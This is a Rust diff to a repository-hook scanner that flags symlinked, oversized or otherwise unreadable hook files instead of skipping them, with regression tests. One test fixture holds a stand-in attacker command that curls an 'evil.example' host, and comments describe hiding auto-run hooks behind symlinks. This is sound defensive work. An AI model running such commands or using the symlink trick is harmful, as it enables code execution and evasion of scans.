@@ -591,9 +591,11 @@ fn collect_husky(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
     }
 }
 
-/// Read a git/husky hook FILE and push its entry. An unreadable file (perms / non-UTF-8)
-/// is NOT silently dropped — a deliberately-unreadable hook is the one a scan must not
-/// miss — it surfaces as an Info "present but unreadable" finding.
+/// Read a git/husky hook FILE and push its entry. An unreadable file (perms /
+/// symlink / oversize / non-UTF-8) is NOT silently dropped — a deliberately-unreadable
+/// hook is the one a scan must not miss — it surfaces as an Info "present but
+/// unreadable" finding. An absent file produces nothing (the `read_dir` walk that
+/// found it means this normally only sees blocked, never absent).
 fn push_hook_file(
     out: &mut Vec<RepoHookEntry>,
     repo_root: &Path,
@@ -603,30 +605,45 @@ fn push_hook_file(
     git_events: Vec<String>,
 ) {
     match read_text(&path, repo_root) {
-        Some(body) => push_entry(out, name, provider, path, body, git_events),
-        None => {
-            let location = path.display().to_string();
-            let finding = RepoHookFinding {
-                rule_id: RuleId::RepoHookSuspiciousShellPattern,
-                severity: Severity::Info,
-                name: name.clone(),
-                provider,
-                location: location.clone(),
-                detail: "hook present but unreadable (permission denied or non-UTF-8) — \
-                         review manually"
-                    .to_string(),
-            };
-            out.push(RepoHookEntry {
-                name,
-                category: provider.category(),
-                provider,
-                source_path: path,
-                body: String::new(),
-                git_events,
-                findings: vec![finding],
-            });
+        ReadOutcome::Text(body) => push_entry(out, name, provider, path, body, git_events),
+        ReadOutcome::Unreadable(reason) => {
+            push_unreadable_entry(out, name, provider, path, git_events, &reason)
         }
+        ReadOutcome::Absent => {}
     }
+}
+
+/// Push an Info "present but unreadable: <reason>" placeholder entry for a surface
+/// that exists but could not be read into a classifiable body. Shared by every
+/// collector so a blocked surface (symlinked / oversized / unreadable) is INVENTORIED
+/// and flagged rather than silently dropped — dropping it would let an attacker hide
+/// an auto-run hook behind a symlink and make a leader-targeted scan come back CLEAN.
+fn push_unreadable_entry(
+    out: &mut Vec<RepoHookEntry>,
+    name: String,
+    provider: HookProvider,
+    path: PathBuf,
+    git_events: Vec<String>,
+    reason: &str,
+) {
+    let location = path.display().to_string();
+    let finding = RepoHookFinding {
+        rule_id: RuleId::RepoHookSuspiciousShellPattern,
+        severity: Severity::Info,
+        name: name.clone(),
+        provider,
+        location,
+        detail: format!("present but unreadable ({reason}) — review manually"),
+    };
+    out.push(RepoHookEntry {
+        name,
+        category: provider.category(),
+        provider,
+        source_path: path,
+        body: String::new(),
+        git_events,
+        findings: vec![finding],
+    });
 }
 
 /// Parse `lefthook.yml` into one classifiable body per top-level git event (so a `run:`
@@ -634,8 +651,22 @@ fn push_hook_file(
 fn collect_lefthook(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
     for rel in ["lefthook.yml", "lefthook.yaml"] {
         let path = repo_root.join(rel);
-        let Some(contents) = read_text(&path, repo_root) else {
-            continue;
+        let contents = match read_text(&path, repo_root) {
+            ReadOutcome::Text(c) => c,
+            // Present but blocked: inventory the config file itself so a symlinked /
+            // oversized lefthook config can't suppress its events from the scan.
+            ReadOutcome::Unreadable(reason) => {
+                push_unreadable_entry(
+                    out,
+                    rel.to_string(),
+                    HookProvider::Lefthook,
+                    path,
+                    Vec::new(),
+                    &reason,
+                );
+                return; // only one lefthook config
+            }
+            ReadOutcome::Absent => continue,
         };
         for (event, body) in lefthook_events(&contents) {
             push_entry(
@@ -692,8 +723,22 @@ fn lefthook_events(contents: &str) -> Vec<(String, String)> {
 fn collect_pre_commit(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
     for rel in [".pre-commit-config.yaml", ".pre-commit-config.yml"] {
         let path = repo_root.join(rel);
-        let Some(contents) = read_text(&path, repo_root) else {
-            continue;
+        let contents = match read_text(&path, repo_root) {
+            ReadOutcome::Text(c) => c,
+            // Present but blocked: inventory under the pre-commit event (keeping the
+            // git_event so `git commit` still surfaces it) rather than dropping it.
+            ReadOutcome::Unreadable(reason) => {
+                push_unreadable_entry(
+                    out,
+                    "pre-commit".to_string(),
+                    HookProvider::PreCommit,
+                    path,
+                    vec!["pre-commit".to_string()],
+                    &reason,
+                );
+                return;
+            }
+            ReadOutcome::Absent => continue,
         };
         push_entry(
             out,
@@ -711,8 +756,23 @@ fn collect_pre_commit(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
 /// entry (no git event). Parsed with `serde_json`; a malformed manifest is skipped.
 fn collect_package_json(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
     let path = repo_root.join("package.json");
-    let Some(contents) = read_text(&path, repo_root) else {
-        return;
+    let contents = match read_text(&path, repo_root) {
+        ReadOutcome::Text(c) => c,
+        // Present but blocked: inventory under the package.json provider so an
+        // `npm install` leader scan still surfaces a symlinked / oversized manifest
+        // instead of treating it as absent.
+        ReadOutcome::Unreadable(reason) => {
+            push_unreadable_entry(
+                out,
+                "package.json".to_string(),
+                HookProvider::PackageJson,
+                path,
+                Vec::new(),
+                &reason,
+            );
+            return;
+        }
+        ReadOutcome::Absent => return,
     };
     let Ok(value) = serde_json::from_str::<serde_json::Value>(&contents) else {
         return;
@@ -738,8 +798,22 @@ fn collect_package_json(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
 /// `.envrc` (direnv) — auto-sourced on `cd` after `direnv allow`. Whole file is the body.
 fn collect_direnv(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
     let path = repo_root.join(".envrc");
-    let Some(contents) = read_text(&path, repo_root) else {
-        return;
+    let contents = match read_text(&path, repo_root) {
+        ReadOutcome::Text(c) => c,
+        // Present but blocked: inventory the `.envrc` so a `direnv allow` leader scan
+        // still surfaces a symlinked / oversized `.envrc` instead of dropping it.
+        ReadOutcome::Unreadable(reason) => {
+            push_unreadable_entry(
+                out,
+                ".envrc".to_string(),
+                HookProvider::Direnv,
+                path,
+                Vec::new(),
+                &reason,
+            );
+            return;
+        }
+        ReadOutcome::Absent => return,
     };
     push_entry(
         out,
@@ -786,10 +860,14 @@ fn collect_named_surfaces(
     let mut seen: Vec<PathBuf> = Vec::new();
     for (rel, provider) in surfaces {
         let path = repo_root.join(rel);
-        let Some(contents) = read_text(&path, repo_root) else {
+        let outcome = read_text(&path, repo_root);
+        // Absent surfaces are genuinely not there — skip without touching dedup.
+        if matches!(outcome, ReadOutcome::Absent) {
             continue;
-        };
-        // Canonicalize for the dedup key; fall back to the literal path.
+        }
+        // Canonicalize for the dedup key; fall back to the literal path. Applies to
+        // the unreadable case too, so a case-insensitive FS doesn't inventory
+        // `Makefile`/`makefile` twice.
         let canon = path.canonicalize().unwrap_or_else(|_| path.clone());
         if seen.contains(&canon) {
             continue;
@@ -800,7 +878,17 @@ fn collect_named_surfaces(
             .and_then(|n| n.to_str())
             .unwrap_or(rel)
             .to_string();
-        push_entry(out, name, *provider, path, contents, Vec::new());
+        match outcome {
+            ReadOutcome::Text(contents) => {
+                push_entry(out, name, *provider, path, contents, Vec::new());
+            }
+            // Present but blocked: inventory so a symlinked / oversized task-runner or
+            // mise/asdf surface is flagged rather than silently dropped.
+            ReadOutcome::Unreadable(reason) => {
+                push_unreadable_entry(out, name, *provider, path, Vec::new(), &reason);
+            }
+            ReadOutcome::Absent => unreachable!("absent handled above"),
+        }
     }
 }
 
@@ -1109,29 +1197,68 @@ const GIT_EVENTS: &[&str] = &[
 /// an arbitrary-size disclosure channel.
 const MAX_HOOK_BODY_SIZE: u64 = 256 * 1024;
 
+/// Outcome of reading a hook / automation body, distinguishing a genuinely
+/// ABSENT surface (skip it) from a PRESENT-but-blocked one (must still be
+/// inventoried as an Info "unreadable" finding, never silently dropped — a
+/// surface hidden behind a symlink is exactly the one a scan must not miss).
+enum ReadOutcome {
+    /// The file does not exist (`ENOENT`) — genuinely not a surface here.
+    Absent,
+    /// Present but could not be read into a classifiable body: a symlinked final
+    /// component, an intermediate-dir symlink escaping `repo_root`, an oversized
+    /// body, a non-regular file, a permission/IO error, or non-UTF-8 content.
+    /// Carries a short reason for the Info "present but unreadable" finding.
+    Unreadable(String),
+    /// The body text, ready to classify / inventory.
+    Text(String),
+}
+
 /// Read a hook / automation body as UTF-8 text, REFUSING to follow a symlink and
-/// REFUSING to read outside `repo_root`. `None` (treated as "unreadable", never a
-/// panic) for dirs, missing files, perms, non-regular files, a symlinked final
-/// component, an oversized body, or any path that resolves outside `repo_root`
-/// (an intermediate-dir symlink redirecting `.git`/`.husky` elsewhere).
+/// REFUSING to read outside `repo_root`. Distinguishes [`ReadOutcome::Absent`]
+/// (missing file) from [`ReadOutcome::Unreadable`] (present but blocked: dirs,
+/// perms, non-regular files, a symlinked final component, an oversized body, or
+/// any path resolving outside `repo_root` via an intermediate-dir symlink
+/// redirecting `.git`/`.husky` elsewhere). NEVER panics.
 ///
 /// The body is emitted verbatim by `tirith hooks explain` (credential-redacted
 /// only), so a followed symlink here would disclose an arbitrary file's contents —
 /// hence `O_NOFOLLOW` (final component) + [`crate::util::canonical_within`]
-/// (intermediate dirs) + a size cap. A non-UTF-8 body yields `None` (handled
-/// gracefully, never a panic), preserving the prior `read_to_string().ok()`
-/// "non-UTF-8 → unreadable" contract for callers like [`push_hook_file`] that
-/// surface unreadable as an Info finding.
-fn read_text(path: &Path, repo_root: &Path) -> Option<String> {
+/// (intermediate dirs) + a size cap. A non-UTF-8 body is [`ReadOutcome::Unreadable`]
+/// (handled gracefully, never a panic), preserving the prior "non-UTF-8 →
+/// unreadable" contract so callers surface it as an Info finding rather than
+/// dropping the surface.
+fn read_text(path: &Path, repo_root: &Path) -> ReadOutcome {
     // Reject an intermediate-directory symlink that redirects the read outside the
-    // repo (O_NOFOLLOW below only guards the final component).
+    // repo (O_NOFOLLOW below only guards the final component). A non-existent path
+    // also fails containment, so distinguish absent from blocked first.
     if !crate::util::canonical_within(path, repo_root) {
-        return None;
+        return match path.symlink_metadata() {
+            // The path simply isn't there — genuinely absent.
+            Err(e) if e.kind() == std::io::ErrorKind::NotFound => ReadOutcome::Absent,
+            // It exists (or its existence is otherwise observable) but resolves
+            // outside the repo — a present-but-blocked surface.
+            _ => ReadOutcome::Unreadable("path escapes repository root".to_string()),
+        };
     }
-    let bytes = crate::util::read_text_no_follow_capped(path, MAX_HOOK_BODY_SIZE).ok()?;
-    // A non-UTF-8 body is "unreadable" (the prior `read_to_string().ok()` contract);
-    // surfaces as the Info "present but unreadable" finding for hook files.
-    String::from_utf8(bytes).ok()
+    match crate::util::read_text_no_follow_capped(path, MAX_HOOK_BODY_SIZE) {
+        Ok(bytes) => match String::from_utf8(bytes) {
+            Ok(text) => ReadOutcome::Text(text),
+            // A non-UTF-8 body is "unreadable" (the prior contract); surfaces as the
+            // Info "present but unreadable" finding rather than being dropped.
+            Err(_) => ReadOutcome::Unreadable("non-UTF-8 content".to_string()),
+        },
+        Err(crate::util::OpenRegularError::NotFound) => ReadOutcome::Absent,
+        Err(crate::util::OpenRegularError::NotRegularFile) => {
+            // A symlinked final component (ELOOP) maps here, as do FIFO/device/dir.
+            ReadOutcome::Unreadable("symlink or non-regular file".to_string())
+        }
+        Err(crate::util::OpenRegularError::TooLarge) => {
+            ReadOutcome::Unreadable("body exceeds size cap".to_string())
+        }
+        Err(crate::util::OpenRegularError::Io(_)) => {
+            ReadOutcome::Unreadable("permission denied or I/O error".to_string())
+        }
+    }
 }
 
 /// Build a name→entries map for callers that want grouped lookups.
@@ -1829,6 +1956,82 @@ mod tests {
                 .iter()
                 .all(|e| !e.body.contains("SECRET_TOKEN_xyz789")),
             "a hook outside repo_root must never have its body disclosed"
+        );
+    }
+
+    /// Regression (no-follow read hardening): a PRESENT-but-blocked single-file
+    /// surface read by a non-`push_hook_file` collector (here `.envrc` as a symlink,
+    /// O_NOFOLLOW-rejected) must STILL be inventoried as an Info "present but
+    /// unreadable" entry, never silently dropped. Dropping it would let an attacker
+    /// hide an auto-run `.envrc` behind a symlink so a `direnv allow` scan comes back
+    /// clean.
+    #[cfg(unix)]
+    #[test]
+    fn blocked_single_file_surface_surfaces_info_not_silence() {
+        let root = tempdir().unwrap();
+        // A sentinel OUTSIDE the repo holding a rule-tripping `curl` + a secret.
+        let outside = tempdir().unwrap();
+        let sentinel = outside.path().join("secret_envrc");
+        std::fs::write(
+            &sentinel,
+            "export X=1\ncurl https://evil.example/x # SECRET_ENVRC_qwerty\n",
+        )
+        .unwrap();
+        // repo/.envrc -> <outside>/secret_envrc (symlinked final component). The
+        // parent (.envrc's dir) is the repo root, so `canonical_within` passes the
+        // containment check and `read_text` reaches the O_NOFOLLOW reject.
+        std::os::unix::fs::symlink(&sentinel, root.path().join(".envrc")).unwrap();
+
+        let scan = scan_for_repo(root.path());
+        let envrc = scan
+            .entries
+            .iter()
+            .find(|e| e.name == ".envrc")
+            .expect("a present-but-blocked .envrc must still be inventoried, not dropped");
+        // The Info "present but unreadable" finding is required...
+        assert!(
+            envrc
+                .findings
+                .iter()
+                .any(|f| f.severity == Severity::Info && f.detail.contains("unreadable")),
+            "a blocked .envrc must surface the Info unreadable finding, got {:?}",
+            envrc.findings
+        );
+        // ...the body must not be read through the symlink...
+        assert!(
+            envrc.body.is_empty() && !envrc.body.contains("SECRET_ENVRC_qwerty"),
+            "a symlinked .envrc body must not be disclosed, got {:?}",
+            envrc.body
+        );
+        // ...and no body-derived rule (the curl network-call) may fire.
+        assert!(
+            !envrc
+                .findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::RepoHookNetworkCall),
+            "a body rule must not fire on a symlink-rejected .envrc: {:?}",
+            envrc.findings
+        );
+    }
+
+    /// The complement: a genuinely-ABSENT surface still produces NO entry — the fix
+    /// only splits the old `None` into Absent (skip) vs Unreadable (inventory), it
+    /// must not start inventorying files that simply aren't there.
+    #[test]
+    fn absent_surface_produces_no_entry() {
+        let root = tempdir().unwrap();
+        mkgit(root.path());
+        // Only an empty `.git/hooks` exists — no .envrc, no package.json, no hooks.
+        let scan = scan_for_repo(root.path());
+        assert!(
+            scan.entries.is_empty(),
+            "absent surfaces must yield no entries, got {:?}",
+            scan.entries.iter().map(|e| &e.name).collect::<Vec<_>>()
+        );
+        // Specifically, the missing `.envrc` must not have produced a placeholder.
+        assert!(
+            !scan.entries.iter().any(|e| e.name == ".envrc"),
+            "a missing .envrc must not be inventoried"
         );
     }
 }
